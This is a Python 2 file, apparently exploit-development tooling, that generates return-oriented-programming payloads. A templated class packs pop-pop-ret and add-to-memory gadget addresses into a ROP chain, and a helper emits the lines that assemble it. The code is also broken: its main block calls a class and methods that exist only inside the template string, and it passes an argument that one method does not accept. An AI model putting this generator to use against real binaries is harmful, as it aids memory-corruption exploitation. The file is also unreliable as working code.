#!/usr/bin/env python
# -*- coding: utf-8 -*-

class PayloadGenerator():
	
	code_template = '''
import struct

class GadgetAction():
	ADD = 0x1
	MOVE = 0x2
	POP = 0x3

class PayloadGenerator():

	# Address of ppr gadget
	ppr_addr = PPR_ADDR
	# Address of  
	add_mem_to_reg = ADD_MEM_TO_REG
	add_reg_to_mem = ADD_REG_TO_MEM

	def __init__(self):
		pass

	def ppr(self, addr, action):
		ppr_str = ""
		if (action == GadgetAction.ADD):
			ppr_str += struct.pack("<I", self.ppr_addr)
			ppr_str += struct.pack("<I", addr)
			ppr_str += struct.pack("<I", 0x44444444)
		elif (action == GadgetAction.MOVE):
			ppr_str += struct.pack("<I", self.ppr_addr)
			ppr_str += struct.pack("<I", addr)
			ppr_str += struct.pack("<I", 0x61616161)
 		elif (action == GadgetAction.POP):
 			ppr_str += struct.pack("<I", self.ppr_addr)
 			ppr_str += struct.pack("<I", 0x68686868)
 			ppr_str += struct.pack("<i", addr)
		else:
			raise NotImplementedError("No corresponding action found")
		return ppr_str

	def add_to_reg_from_mem(self):
		add_str = struct.pack("<I", self.add_mem_to_reg)
		return add_str

	def add_to_mem_from_reg(self):
		add_str	= struct.pack("<I", self.add_reg_to_mem)
		return add_str

pg = PayloadGenerator()

'''
	
	def add_prologue(self):
		return self.code_template

	def add_payload(self, candidates, results, stack_frame=0x0804a110):
		"""
		"""
		ppr_add = "payload += pg.ppr(%s, GadgetAction.ADD)\n"
		ppr_move = "payload += pg.ppr(%s, GadgetAction.MOVE)\n"
		add = "payload += pg.add_to_reg_from_mem()\n"
		move = "payload += pg.add_to_mem_from_reg()\n"
		python_code = ""
		
		copy_results = results[::]
		
		for k,v in candidates.iteritems():
			for i in enumerate(copy_results):
				if copy_results[i[0]] == v:
					python_code += (ppr_add % hex(k))
					python_code += add
					del copy_results[i[0]]
		python_code += (ppr_move % hex(stack_frame))
		python_code += move
		return python_code

if __name__ == "__main__":
	payload = ""
	pg = PayloadGenerator()
	payload += pg.ppr(0x61626364, GadgetAction.ADD)
	payload += pg.add_to_reg_from_mem(0xdeadbeef)
	print payload
